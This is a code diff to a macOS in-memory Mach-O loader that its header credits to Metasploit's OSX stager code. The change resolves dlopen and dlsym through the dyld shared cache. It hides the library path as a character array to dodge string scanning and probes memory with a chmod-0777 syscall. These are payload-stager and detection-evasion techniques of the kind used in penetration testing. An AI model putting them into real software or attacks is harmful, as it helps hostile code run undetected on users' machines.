@@ -1,3 +1,16 @@
+/*
+ * Based on Metasploit's OSX Stager Code
+ * Copyright: 2006-2026, Rapid7, Inc.
+ * License: BSD-3-clause
+ *
+ * References:
+ * @parchedmind
+ * https://github.com/CylanceVulnResearch/osx_runbin/blob/master/run_bin.c
+ *
+ * @nologic
+ * https://github.com/nologic/shellcc
+ */
+
 #include <mach-o/loader.h>
 #include <mach-o/nlist.h>
 #include <fcntl.h>
@@ -490,35 +503,37 @@ static int beignet_loader(void *buffer_ro, uint64_t buffer_size, const char *ent
     if (dcimg->address < 0x100000000) {
       return 25;
     }
-    // Resolve dlopen/dlsym without relying on image path strings (which may vary across OS builds).
-    // libdyld is typically near the start of the cache image list, so a small bounded scan is enough.
-    uint32_t scanCount = imagesCount;
-    if (scanCount > 64) {
-      scanCount = 64;
-    }
-    for (uint32_t i = 0; i < scanCount; i++) {
-      uint64_t base_unslid = dcimg[i].address;
-      if (base_unslid < 0x100000000) {
-        continue;
-      }
-      uint64_t base = base_unslid + offset;
-      if (((uint32_t*)base)[0] != MH_MAGIC_64) {
+    char want_libdyld[] = { '/', 'u', 's', 'r', '/', 'l', 'i', 'b', '/', 's', 'y', 's', 't', 'e', 'm', '/', 'l', 'i', 'b', 'd', 'y', 'l', 'd', '.', 'd', 'y', 'l', 'i', 'b', 0 };
+    uint64_t dyld_unslid = 0;
+    for (uint32_t i = 0; i < imagesCount; i++) {
+      uint32_t pfo = dcimg[i].pathFileOffset;
+      if (pfo == 0) {
         continue;
       }
 
-      dlopen_func = (Dlopen_ptr)find_symbol(base, sym_dlopen, offset);
-      if (!dlopen_func) {
+      char *pathi = (char *)shared_region_start + pfo;
+      // Probe whether this is a mapped pointer. Unmapped pointers yield EFAULT (14).
+      if (syscall_chmod((uint64_t)pathi, 0777) == 14) {
         continue;
       }
-      dlsym_func = (Dlsym_ptr)find_symbol(base, sym_dlsym, offset);
-      if (!dlsym_func) {
-        dlopen_func = 0;
-        continue;
+
+      if (string_compare(pathi, want_libdyld) == 0) {
+        dyld_unslid = dcimg[i].address;
+        break;
       }
-      break;
     }
-    if (!dlopen_func || !dlsym_func) {
+    if (!dyld_unslid) {
       return 23;
+    }
+
+    uint64_t dyld = dyld_unslid + offset;
+    dlopen_func = (Dlopen_ptr)find_symbol(dyld, sym_dlopen, offset);
+    if (!dlopen_func) {
+      return 3;
+    }
+    dlsym_func = (Dlsym_ptr)find_symbol(dyld, sym_dlsym, offset);
+    if (!dlsym_func) {
+      return 4;
     }
   } else {
     uint64_t dyld = find_macho(DYLD_BASE_ADDR, 0x1000);
